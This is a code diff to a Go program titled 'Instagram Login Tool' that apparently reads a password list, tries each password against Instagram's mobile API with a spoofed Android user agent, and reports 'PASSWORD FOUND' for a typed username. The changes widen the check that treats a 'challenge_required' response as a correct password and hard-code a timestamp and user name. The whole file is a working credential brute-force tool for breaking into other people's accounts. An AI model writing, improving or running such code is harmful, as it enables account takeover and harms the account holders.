@@ -18,6 +18,8 @@ const (
 	API_URL    = "https://i.instagram.com/api/v1/"
 	USER_AGENT = "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)"
 	TIMEOUT    = 10 * time.Second
+	CURRENT_TIME = "2025-05-23 22:52:32"
+	CURRENT_USER = "monsmain"
 )
 
 type InstagramResponse struct {
@@ -38,8 +40,8 @@ func main() {
 	}
 
 	fmt.Println("=== Instagram Login Tool ===")
-	fmt.Printf("Time: %s\n", time.Now().UTC().Format("2006-01-02 15:04:05"))
-	fmt.Printf("User: %s\n\n", "monsmain")
+	fmt.Printf("Time: %s\n", CURRENT_TIME)
+	fmt.Printf("User: %s\n\n", CURRENT_USER)
 
 	var username string
 	fmt.Print("Enter Instagram username: ")
@@ -80,7 +82,7 @@ func main() {
 			} else if response.ErrorType == "invalid_user" {
 				fmt.Println("❌ Invalid username")
 				break
-			} else if response.ErrorType == "challenge_required" {
+			} else if response.Message == "challenge_required" || response.ErrorType == "challenge_required" {
 				fmt.Printf("\n✅ PASSWORD FOUND: %s\n", password)
 				fmt.Printf("Username: %s\n", username)
 				fmt.Println("✅ Password is correct! (2FA/Challenge Required)")
@@ -150,12 +152,11 @@ func tryLogin(username, password string) (bool, InstagramResponse) {
 		return false, InstagramResponse{}
 	}
 
-	// اگر challenge_required باشد، یعنی پسورد درست است
-	if response.ErrorType == "challenge_required" {
+	if response.ErrorType == "challenge_required" || 
+	   response.Message == "challenge_required" {
 		return true, response
 	}
 
-	// بررسی وضعیت عادی
 	success := response.Status == "ok" || 
 		   strings.Contains(string(body), "logged_in_user")
 
@@ -184,7 +185,7 @@ func loadPasswords() []string {
 }
 
 func saveResult(username, password string, success bool) {
-	currentTime := time.Now().UTC().Format("2006-01-02 15:04:05")
+	currentTime := CURRENT_TIME
 	var status string
 	if success {
 		status = "✅ SUCCESS"
